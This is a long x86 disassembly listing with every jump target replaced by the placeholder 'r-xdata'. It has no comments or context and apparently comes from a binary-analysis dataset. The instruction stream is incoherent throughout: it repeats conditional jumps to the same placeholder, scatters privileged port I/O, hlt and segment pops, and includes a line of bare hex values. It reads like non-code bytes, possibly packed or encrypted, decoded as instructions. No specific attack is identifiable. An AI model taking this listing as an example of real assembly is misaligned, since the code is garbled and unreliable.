jae r-xdata
push 0xffffff9f
jae r-xdata
jecxz r-xdata
insd
and al 0xa6
mov dh 0x68
punpckldq mmx1 [ edi ]
iretd
or edi ebp
jae r-xdata
or esi [ ebp + 0xab5a8ae ]
and al 0xa6
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
and esp [ edi - 0x1d ]
jecxz r-xdata
fsubrp st3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov bl 0xb0
or cl [ 0x73e3e3f4 ]
or dl [ edi ]
mov dl 0xb2
or cl [ edx + 0x731c1c1b ]
or edi [ eax ]
sbb al 0x1c
sbb al 0xb3
or ch [ edi + 0x731c1c19 ]
jae r-xdata
pop edi
jecxz r-xdata
push 0xccdc0a0f
jecxz r-xdata
or dh al
jae r-xdata
or ah [ ebx + 0x731c1c0d ]
pushad
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah [ ebx ]
cmpsb [ esi ] [ edi ]
sbb edx eax
shl [ 0x1ce319a6 ] 0x1
jecxz r-xdata
jecxz r-xdata
push 0xe5f10a13
jecxz r-xdata
and [ ebx + 0x68 ] dh
and ch [ edx ]
and [ esp + esi * 2 ] bl
jae r-xdata
daa
push 0x1c1e3f76
sbb al 0x6a
mov ch 0xb4
jae r-xdata
jecxz r-xdata
or bl [ edi - 0x16 ]
ficomp [ edi + 0x66ecffc7 ]
out 0xe3 al
jecxz r-xdata
jecxz r-xdata
mov ch 0xb4
or ecx [ ecx ]
out dx eax
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
push 0xab2b20f
mov bl [ ebx ]
sbb al 0x1c
push 0xe3e3236d
jae r-xdata
ja r-xdata
mov eax ebp
mov ch 0xa
jae r-xdata
adc ecx [ edi + 0x1ce3d1d0 ]
cmpsb [ esi ] [ edi ]
jecxz r-xdata
push esp
pushad
or bl cl
in al 0xe3
jecxz r-xdata
jae r-xdata
cmp eax 0x731c1c1f
jecxz r-xdata
jae r-xdata
sub ch ah
arpl bx sp
jecxz r-xdata
jae r-xdata
jecxz r-xdata
lahf
in al dx
out 0xe3 al
jae r-xdata
jecxz r-xdata
and eax 0xe3f3c7a7
ficomp [ edi + 0x66ecd7c7 ]
out 0xe3 al
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
and esp [ edi - 0x1d ]
jecxz r-xdata
sbb al 0x1c
mov bl 0xa
scasd [ edi ]
sbb [ esp + ebx ] ebx
jae r-xdata
cmpsd [ esi ] [ edi ]
and esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
add esp ebx
jecxz r-xdata
inc esi
hlt
push 0x65
pop edi
jae r-xdata
mov al 0xa
or eax 0x73e3e3f4
or al [ edx ]
jmp ebx
cmp esp [ esi + 0x38 ]
or ch al
push ds
jecxz r-xdata
cdq
int 0xe3
jecxz r-xdata
call 0x73624036
sbb al 0xb4
mov edi 0xab3951c
cmp [ edx ] cl
jae r-xdata
push 0xe3e35f65
jecxz r-xdata
test [ eax + 0x1a ] esp
mov edi 0xe3ee9e0a
pushad
xchg [ ebx ] bl
jecxz r-xdata
or edx [ eax ]
jae r-xdata
and eax 0xe1f3c7a7
daa
push 0xfffffffb
loope r-xdata
jae r-xdata
mov ah [ ebx ]
jcxz r-xdata
jae r-xdata
jcxz r-xdata
or dh [ eax ]
int3
jae r-xdata
push 0xafbc7a7
pop eax
pop ds
sbb al 0x1c
jae r-xdata
jecxz r-xdata
mov esp [ ebx ]
push es
or esi [ edi - 0xc ]
jecxz r-xdata
in al dx
jecxz r-xdata
nop [ ebx + esi * 2 ] ebx
outsb
int3
mov ah 0xbf
sbb al 0x95
mov ecx [ ecx ]
bound ecx [ ecx ]
xor [ eax + 0x3b ] ch
cmp ah ch
pop ecx
mov al 0x6a
or [ edx + 0x9 ] esp
jae r-xdata
sbb eax 0xa6681c1c
or edx esi
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
movsb [ edi ] [ esi ]
push 0xffffffbe
mov bh 0x68
cmp al [ ebp + 0x68b5be6a ]
jae r-xdata
jae r-xdata
jae r-xdata
mov al 0x6a
jge r-xdata
pushad
daa
push 0x65
pop es
jecxz r-xdata
mov bl 0x1c
xchg esi eax
test [ edx ] 0xe3e3deee
enter 0xe3e3 0xe3
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
mov al [ 0x236685a7 ]
jae r-xdata
jecxz r-xdata
in al dx
xor ch ah
xor ah cl
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
nop
cli
jecxz r-xdata
jecxz r-xdata
mov [ ebx + 0x3da66a85 ] edx
mov ebx 0x890acd89
pop ss
jae r-xdata
pushad
and ah cl
or ch [ 0x731c1c0f ]
jecxz r-xdata
mov ch 0xab
inc edi
jecxz r-xdata
and al 0xbc
mov esi 0x22687320
sub ah [ eax ]
sbb al 0x74
in al dx
test [ esi + 0x23 ] esp
jae r-xdata
mov ebx 0x67ec2366
xor ch ah
push 0xffffffa7
loope r-xdata
jae r-xdata
jae r-xdata
mov ebx [ edx + 0xa7720cd ]
into
xchg [ ebp - 0x22385896 ] al
mov ebx 0xe3c3c50a
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop ss
mov bl 0x24
cmpsb [ esi ] [ edi ]
pop ss
xchg esi eax
nop
xchg [ ecx + 0x1ba62485 ] dl
rcl cl 0x1
and eax 0x1ce319a6
mov ecx esp
sbb al 0xb5
out dx eax
push 0x1c18603b
in al dx
aad 0xc5
jecxz r-xdata
jecxz r-xdata
mov al 0xa
sbb esi eax
jecxz r-xdata
push es
and ebp esp
jae r-xdata
jae r-xdata
jae r-xdata
mov bl 0x24
cmpsb [ esi ] [ edi ]
in al dx
sbb al 0x1c
jae r-xdata
push 0xffffffa6
cmp eax 0xacd89bb
mov [ edi ] edx
jae r-xdata
shl [ ebx ] 0x1
or bh [ 0x731c1c1f ]
push ds
sbb al 0x1c
or al [ ecx + 0x19 ]
sbb al 0x1c
and al 0xa6
pop ds
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ edx ]
out dx eax
jecxz r-xdata
adc eax 0x1c0e040a
sbb al 0x73
jae r-xdata
xchg [ ebx + 0x6a858f89 ] bh
jae r-xdata
jecxz r-xdata
push 0xa38663b
stosd [ edi ]
jecxz r-xdata
jecxz r-xdata
or ecx [ edx ]
or eax 0xaba1c1c
cmp ch ah
jecxz r-xdata
fsubrp st3
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
mov [ ebp + 0x13a66a85 ] eax
mov ebx 0xe3cc590a
in al dx
mov [ esi - 0x7a707645 ] eax
push 0xffffffa6
xor eax 0x17ae6a85
jae r-xdata
sbb al 0x89
jecxz r-xdata
int1
xlat
jecxz r-xdata
mov [ edi + 0x15a66a85 ] ecx
or al [ esi + ecx ]
jae r-xdata
push 0x202a1fa6
mov ch 0xb
pushfd
cmpsb [ esi ] [ edi ]
pop ds
sub ah [ eax ]
sbb al 0xb6
movsb [ edi ] [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
inc ebx
jae r-xdata
cmpsb [ esi ] [ edi ]
fdiv st3
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
cmpsd [ esi ] [ edi ]
and bp sp
pop esp
sbb [ esp + ebx ] ebx
mov ebx esp
sbb al 0x75
dec edi
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0xa
scasb [ edi ]
hlt
jae r-xdata
or bl [ ecx ]
mov ebx eax
jecxz r-xdata
push es
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
or al [ esi - 0x76e3e3e2 ]
mov [ esi + 0x3fa66a85 ] ecx
or dl bh
jecxz r-xdata
xlat
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
test [ ebp - 0x44ec5996 ] eax
or bl [ ecx - 0x34 ]
jecxz r-xdata
sbb al 0x89
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
jecxz r-xdata
adc ch bh
cmpsb [ esi ] [ edi ]
jae r-xdata
and ebp [ edx ]
jecxz r-xdata
mov [ ebx + edi * 4 + 0x6a859389 ] ecx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
aas
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
sbb [ si ] bl
sbb al 0xa
out 0xc4 eax
jecxz r-xdata
outsb
jae r-xdata
jae r-xdata
jae r-xdata
das
jecxz r-xdata
jae r-xdata
popad
scasb [ edi ]
mul ebx
sbb al 0x1c
jae r-xdata
pop [ ebp + 0xa15a66a ]
add al 0xe
outsb
push ebx
push ds
sbb al 0x1c
or ebx [ 0x661c1c0e ]
and ebp esp
test ebp ebp
jecxz r-xdata
jae r-xdata
shr [ eax + 0x25 ] cl
jae r-xdata
jae r-xdata
jae r-xdata
push 0x8580893a
push 0xffffffbe
mov ebx eax
test [ edx - 0x52 ] ebp
jae r-xdata
sbb [ esp + ebx ] ebx
in al dx
inc eax
sbb ebx [ esp + ebx ]
or ch [ esi + 0x73e3e3f4 ]
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xeba6680f
or dh [ edi + 0x73e3e3d7 ]
jae r-xdata
or ah [ esi + eax * 8 + 0xf68e3e3 ]
or ah [ edx - 0x49e3e3eb ]
test [ edx - 0x42 ] ebp
seto [ ebx + 0x250a8f86 ]
sbb eax 0x93681c1c
fnstsw ax
adc ebp esp
push esp
movsd [ edi ] [ esi ]
test [ edx ] 0xe3e3e509
mov ebx 0x37a66a85
shl [ ebx ] 0x1
test [ edx - 0x4a ] ebp
sub eax 0x35a66a85
test [ edx - 0x52 ] ebp
pop ss
daa
fld [ esi - 0x5a ]
btr [ esi ] esp
push 0xffffffa7
out dx al
jecxz r-xdata
out dx al
jecxz r-xdata
and bp sp
0xb73e3e3 0xfb6a
jae r-xdata
cmpsb [ esi ] [ edi ]
push edx
jae r-xdata
and [ ebx + 0x73 ] dh
pushad
jae r-xdata
inc ecx
cmp [ ebp + 0x681dbe6a ] al
cmp [ ebp - 0x76bc4196 ] eax
nop
push 0xbe6a853a
mov [ eax - 0x1c0df2f6 ] edx
jecxz r-xdata
mov eax 0x6a859089
mov esi 0x6a85b84b
mov esi 0x893a6849
add [ ebp - 0x47b04196 ] 0x85
jae r-xdata
mov ebx 0x6a858f89
jae r-xdata
mov bl 0xa
xchg ebp eax
jecxz r-xdata
jecxz r-xdata
jae r-xdata
or edi [ esi ]
jae r-xdata
jecxz r-xdata
or dl [ edx - 0xe ]
jae r-xdata
jecxz r-xdata
movsb [ edi ] [ esi ]
retn
jae r-xdata
push 0xffffffbe
inc ebp
xor bx [ esi ]
sbb al 0x1c
or bl [ ebx - 0x2a ]
jecxz r-xdata
sbb al 0x1c
mov edx 0xe3ec3a0a
jecxz r-xdata
jae r-xdata
or ebx [ esi + ebx + 0x410a1c1c ]
sbb [ esp + ebx ] ebx
jecxz r-xdata
or ebp [ edx - 0x5 ]
jae r-xdata
or eax esp
fsub st3
jecxz r-xdata
bound ecx [ edi ]
dec edi
out 0xe3 eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
jecxz r-xdata
jae r-xdata
in al dx
jae r-xdata
in al dx
or dh [ ebx + 0x731c1c0c ]
imul esi [ edi + 0x1a6027fe ] 0xffffffc3
or dh ch
popad
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
loope r-xdata
mov ebp ecx
or al [ eax + 0x731c1c11 ]
sti
jae r-xdata
xchg edi eax
retn
sbb esp edx
in al dx
dec eax
enter 0xe3e3 0xc2
mov edi 0xa76ef3c7
xor [ ecx ] cl
sbb al 0x1c
add eax ebp
push 0x18d60b25
sbb al 0x1c
mov ebp esp
mov ecx [ ebx ]
loopne r-xdata
jae r-xdata
jecxz r-xdata
cmp edi [ ebx + 0x6a858e89 ]
test [ edx - 0x5a ] ebp
push 0xef27603b
salc
pushad
jecxz r-xdata
add eax ebp
jae r-xdata
and al 0xa6
pushad
in al 0xe3
jecxz r-xdata
pushad
inc edi
mov eax 0x6a859789
mov esi 0x9089b845
mov esi 0x85396841
push 0xffffffbe
jae r-xdata
mov eax 0x4dbe6a85
mov [ eax + 0x4fbe6a85 ] eax
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
mov cl 0xa
mov [ ecx ] bl
or dh [ esp + ecx * 8 ]
jae r-xdata
cmp ah ch
pextrw esp mm3 0xe3
push 0x66f3c7af
sub ch ah
sbb al 0xa
inc edi
outsb
cmpsb [ esi ] [ edi ]
cmp esp esp
jecxz r-xdata
mov al 0x1c
jne r-xdata
nop [ edx + edi * 4 ] ebx
pushad
jae r-xdata
or ah [ eax + 0x73e3e3f7 ]
or ah cl
loop r-xdata
push 0xbe6a8539
outsb
dec edi
test [ edx - 0x42 ] ebp
jae r-xdata
mov edi esp
or al [ ecx + eax * 8 - 0x1d ]
jecxz r-xdata
or ch dh
fsubrp st3
jecxz r-xdata
jecxz r-xdata
inc ebx
jae r-xdata
jmp r-xdata
and eax 0x1c18d60b
cmovg esp edi
jecxz r-xdata
jae r-xdata
in eax 0x8b
or esp eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
sbb cl [ ebx - 0x3acb9e14 ]
jecxz r-xdata
mov bh 0xfe
daa
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
jae r-xdata
jecxz r-xdata
mov esi 0x6a85b84f
mov esi 0xa90894d
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
int 0xa
adc [ ecx ] 0x1c
sbb al 0x73
jae r-xdata
or [ edx ] 0x5a
retn
loope r-xdata
pushad
or dh [ eax ]
or [ esp + ebx ] ebx
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
jecxz r-xdata
mov dh 0xa
xor al 0xcc
jecxz r-xdata
jae r-xdata
sbb al 0xe0
in al dx
popad
sub esp esp
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cdq
push ebx
and eax [ esi ]
jae r-xdata
jae r-xdata
or edi [ edx + 0x19880ab1 ]
jecxz r-xdata
jae r-xdata
sbb al 0x1c
scasd [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
in al 0xe3
cmc
sub ah [ eax ]
jae r-xdata
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xbeba668 ]
nop [ edx + edi * 4 ] ebx
push 0xffffffbe
jae r-xdata
jae r-xdata
or cl [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
sbb al 0x68
cmp esp [ eax + 0x27 ]
out dx eax
sbb al 0xb5
jmp r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb esp edx
in al dx
in al 0xe3
jecxz r-xdata
retn 0xc7bf
dec ebp
jae r-xdata
enter 0xe3e3 0xe3
cmpsb [ esi ] [ edi ]
pop ds
sbb al bl
jae r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ edx - 0x5a ] ebp
adc edi [ ebx - 0x1c33a6f6 ]
jae r-xdata
in al dx
call 0xb2a0bb6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
nop
or cl [ 0xffffffffbde3e3f2 ]
jae r-xdata
jae r-xdata
jae r-xdata
or dl [ ecx + 0x68e3e3d3 ]
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
jecxz r-xdata
mov eax 0xa668202a
add al 0x1c
rcr [ edx + ecx ] 0x1
jae r-xdata
jae r-xdata
or eax 0xbde3e3f2
jae r-xdata
jae r-xdata
jae r-xdata
shl ebx cl
jae r-xdata
mov esi 0x1a540b1f
jae r-xdata
and eax esi
jecxz r-xdata
call 0xb2a0bb6
adc [ esp + ebx ] bx
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
cdq
int 0xe3
jecxz r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah [ esi + 0x11 ]
jae r-xdata
aas
push 0x9e6a851a
pop ss
or cl [ edi + 0x241c1c09 ]
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
aaa
mov bl 0xa
mov bl 0xc
sbb al 0x1c
jae r-xdata
xchg [ edi ] bl
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
daa
out dx eax
or bl [ eax + 0x731c1c0f ]
jae r-xdata
or edx [ edx + ebx + 0x1c ]
jae r-xdata
jae r-xdata
out 0xe3 al
jae r-xdata
and al 0xa6
daa
mov ch 0xae
xchg esp eax
loopne r-xdata
and esp [ ebx + 0x7373202a ]
jae r-xdata
or bl [ ebx + 0x73e3e3e6 ]
sbb al 0xec
jae r-xdata
lahf
mov edi 0x1967ece3
and ecx esp
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
test [ edx - 0x42 ] ebp
dec ebx
mov eax 0x49be6a85
mov ebp 0x73737320
jae r-xdata
jae r-xdata
and ah ch
in al 0xe3
jecxz r-xdata
cmp al bl
adc [ edx ] cl
stosb [ edi ]
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
add eax 0x73e3e3c0
out 0xc6 al
sbb al 0xec
jae r-xdata
pushad
sbb bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
jae r-xdata
lodsb [ esi ]
jecxz r-xdata
jae r-xdata
adc al 0xa
movsd [ edi ] [ esi ]
adc [ esp + ebx ] bl
or bl [ ecx ]
jpo r-xdata
jae r-xdata
loop r-xdata
pushad
in al dx
jae r-xdata
pushad
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al [ ebp + 0xa179e6a ]
jecxz r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
push ebx
mov bl 0x6e
xchg [ esp + ebx ] bx
sbb al 0xb3
or al [ 0x73e3e3c0 ]
loop r-xdata
mov al 0xb3
pop ds
sbb al 0x1c
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x60
jmp r-xdata
mov ebp 0x68202ab8
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jecxz r-xdata
mov dh 0x68
punpckldq mmx1 [ edi ]
test [ edx - 0x5a ] ebp
jecxz r-xdata
out 0xc6 al
jae r-xdata
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
fwait
in al dx
sbb edi eax
jecxz r-xdata
pop ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x74
jae r-xdata
xor [ ebx + 0xabacd89 ] edi
push 0xa66a8521
jae r-xdata
or bh dl
push 0xffffffbe
inc ebx
or dh bh
or [ esp + ebx ] bl
jae r-xdata
outsd
push ds
sbb al 0x1c
test [ edx - 0x62 ] ebp
jne r-xdata
mov al 0xb5
mov ah 0x89
xchg ebx eax
mov esp 0x24689189
test [ edx - 0x5a ] ebp
popad
adc edi edi
jecxz r-xdata
sbb al 0x73
in al dx
in ax 0xe3
jecxz r-xdata
and [ ebp - 0x44ce5996 ] eax
mov ebp ecx
mov edx 0x1c04ac0a
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg ecx eax
in al dx
shl bl 0xe3
jae r-xdata
mov ebp [ edx - 0x4b82cf98 ]
push 0xffffffa5
or ebp esi
int1
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
jae r-xdata
sbb al 0x54
jecxz r-xdata
outsb
pop edi
outsd
bound ecx [ edi ]
mov bl 0xb5
or esp ecx
and bp sp
pop esi
jae r-xdata
daa
jecxz r-xdata
push esp
jae r-xdata
push 0xffffffa7
jae r-xdata
push 0xffffffa7
pushad
xchg edi eax
or cl [ ebx - 0x3 ]
jecxz r-xdata
push ebp
mov al [ 0x650ab3db ]
jecxz r-xdata
jecxz r-xdata
mov al 0x1c
xchg edi eax
jecxz r-xdata
sub ah [ eax ]
sbb al 0x96
jae r-xdata
mov bl 0xd0
adc eax 0xe3cdaa0a
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb eax 0x1c1f730a
sbb al 0x73
jae r-xdata
shl [ ebx ] 0x1
mov [ 0xffffffffe3f8fa0a ] eax
jecxz r-xdata
and edi [ ebp - 0x1c186ff6 ]
jecxz r-xdata
jae r-xdata
and edx [ ebx + edi ]
sub ah [ eax ]
jecxz r-xdata
push 0xffffffbe
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push esp
and ebp esp
jae r-xdata
or edi eax
int1
jecxz r-xdata
or bl [ ebx + 0x8 ]
sbb al 0x1c
jae r-xdata
loope r-xdata
push 0xe2f3c7a7
cmpsd [ esi ] [ edi ]
sbb al 0x60
jae r-xdata
jecxz r-xdata
pop ds
jae r-xdata
je r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x1c0f790a
or dh [ ebp + 0x14 ]
jecxz r-xdata
shl [ ebx ] 0x1
mov ebp 0xe3e7900a
jae r-xdata
int3
cli
pop ds
jae r-xdata
jecxz r-xdata
xchg [ edi - 0x59db3271 ] ecx
pop ds
xchg [ edi - 0x4ce31c71 ] ecx
fwait
adc al 0x3b
clc
push 0xeb0f620f
loope r-xdata
test [ edx - 0x5a ] ebp
sbb al 0xa
jae r-xdata
and ebp esp
pop ss
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
push ebx
xor ah dh
jecxz r-xdata
mov ebx esp
sbb al 0x75
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
xchg ebp eax
sbb esp [ ebx - 0x1c149e14 ]
jecxz r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or ebp [ ebx ]
sbb [ esp + ebx ] bl
pushad
push 0xffffffa6
mov dh 0xa
fsincos
jecxz r-xdata
xchg ebp eax
xchg esi eax
jae r-xdata
jecxz r-xdata

jecxz r-xdata
or edi ebp
jae r-xdata
jne r-xdata
jne r-xdata
jmp r-xdata
or al 0x1c
jae r-xdata
jecxz r-xdata
sbb [ edx ] ecx
push 0xffffffa6
push esp
jae r-xdata
idiv [ ebx - 0x1c0455f6 ]
jecxz r-xdata
mov ch 0xb4
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl esp cl
jae r-xdata
jmp 0x2daf0c7c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub cl [ edx ]
mov esp ss
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
mov ch 0xb4
mov [ edx + 0xa9589b9 ] eax
fiadd [ esi ]
mov eax 0x961c202a
or cl [ ebx + 0x731c1c0c ]
mov ebx 0x1c18b40a
sbb al 0x73
sbb al 0x75
dec edi
sub ah [ eax ]
jae r-xdata
xchg ebp eax
and edi [ edx + 0x1bbe6aba ]
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov ah 0x89
cmp [ ecx - 0x25f56a77 ] 0x6
sbb eax 0xe3d3a50a
test [ ebp - 0x44e45996 ] eax
mov ebp ecx
test [ edx - 0x5a ] ebp
sbb [ ebx + 0x1fa66a85 ] edi
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
mov [ ebx + 0x689189bc ] edx
and al 0x85
push 0xffffffa6
sbb bx [ esi ]
sbb al 0x1c
or ch [ edi ]
or al 0x1c
or bh [ ecx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
or [ esp + ebx ] bl
adc ax 0x770a
out dx al
mov bl 0x89
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
xchg esi eax
outsb
adc ebx [ esp + ebx ]
jae r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or edi edx
push ds
in eax dx
cmc
jecxz r-xdata
jae r-xdata
or dl [ ebx ]
nop [ ebx + esi * 2 ] ebx
jae r-xdata
pop es
sbb al 0x96
mov bl 0xb0
or bh [ ebx + ecx * 8 + 0x7373e3e3 ]
test [ edx - 0x42 ] ebp
sbb al 0x95
in al dx
or esi [ edi ]
jae r-xdata
sbb al 0x96
and al 0xa6
jae r-xdata
jae r-xdata
jae r-xdata
pop edi
jae r-xdata
mov dh 0x68
test [ esi + 0x15 ] esp
or dh [ edi - 0x12 ]
jecxz r-xdata
rcl [ 0xffffffffe3cdaa0a ] 0x1
outsb
mov bh 0xa
stosb [ edi ]
jecxz r-xdata
sbb al 0x95
mov bl 0x1c
nop [ ebx + esi * 2 ] ebx
jae r-xdata
xchg ecx eax
jae r-xdata
jae r-xdata
sti
sbb al 0xb5
xchg edi eax
or bl [ esi ]
loope r-xdata
jae r-xdata
enter 0xe3e3 0x73
cmpsb [ esi ] [ edi ]
aas
mov [ eax - 0x59db7a74 ] ss
add edx [ edi + 0x2495abc3 ]
cmpsb [ esi ] [ edi ]
cmp dl [ 0xffffffffb8bc1c1c ]
jae r-xdata
jecxz r-xdata
mov ebp [ eax + ecx ]
or eax [ esi ]
in al dx
jecxz r-xdata
or bl bl
or eax 0xbfa56ab4
or dh [ ebp + 0x17 ]
in al dx
jecxz r-xdata
jae r-xdata
or bl dl
push es
push 0xef0f600f
and ecx [ ebp + 0xaaeaeb5 ]
xchg ecx eax
jae r-xdata
or bh [ edx ]
adc eax 0xb8bc1c1c
cmpsb [ esi ] [ edi ]
jmp r-xdata
popad
jmp r-xdata
jecxz r-xdata
dec edi
daa
or dh bh
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x97
jecxz r-xdata
daa
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
push ds
sbb al 0x1c
or dl bl
hlt
retn
jae r-xdata
jae r-xdata
or cl [ ecx ]
sbb [ esp + ebx ] bl
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6f656ab4
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
dec edx
adc [ esp + ebx ] bl
jae r-xdata
push 0xffffffa5
mov ebx 0xe3ec100b
jecxz r-xdata
jae r-xdata
mov ch 0xae
scasb [ edi ]
or dl [ ecx + 0x73e3e3c8 ]
bound ecx [ edi ]
shl ecx cl
mov ah 0x18
and [ ebx + 0x73 ] dh
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
test [ edx - 0x4a ] ebp
iretd
and al 0xa
aas
leave
jecxz r-xdata
sar [ eax ] 0x1
fcom [ eax ]
or ch [ edx + 0x731c1c0a ]
outsb
cmpsd [ esi ] [ edi ]
sbb al 0x97
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
jecxz r-xdata
adc ah ch
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and eax [ ebp + 0xa1da66a ]
movsd [ edi ] [ esi ]
shl ebx cl
fisttp [ 0xffffffffbfa56ab4 ]
sub al 0x8
sbb al 0x1c
push 0xe3e35f65
or dh [ ecx + 0x73e3e3e7 ]
jae r-xdata
jae r-xdata
pop ss
push 0x961ceba6
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
or cl bl
outsb
sub ebx [ esi ]
sbb al 0x1c
or ebx [ edx ]
mov esp 0x85b98f89
push 0xffffffb6
int 0x85
push 0xffffffb6
ror [ edx ] cl
mov bh 0x8
sbb al 0x1c
jae r-xdata
or bh [ ebx ]
out 0xe3 eax
jecxz r-xdata
pushad
daa
aaa
or edi edi
sbb [ esp + ebx ] bl
mov edx 0x1c13f40a
pushad
xchg edi eax
sbb al 0x1c
or al [ ebp + 0x1e ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
mov bl 0xa
or [ eax ] ebx
sbb al 0x1c
pxor mm5 [ esi - 0x5a ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
enter 0xe3e3 0x73
jae r-xdata
jecxz r-xdata
pushad
jae r-xdata
jae r-xdata
jae r-xdata
push ds
jecxz r-xdata
int1
jae r-xdata
jae r-xdata
les cx [ eax ]
sbb al 0x1c
or esi [ edx - 0xb ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
mov ecx [ esp + ebx ]
lea esi [ ebp - 0x6ef55152 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0x85
push 0xe085e1a4
cmpsd [ esi ] [ edi ]
imul esp ebx 0xffffffe2
jecxz r-xdata
out dx eax
or bl [ edi ]
hlt
sbb al 0x75
dec edi
aas
mov ebx 0x1c14a00a
mov al 0x1c
jne r-xdata
in al 0xe3
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
or al cl
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
xchg [ esp + ebx ] bx
jae r-xdata
push esp
jae r-xdata
jae r-xdata
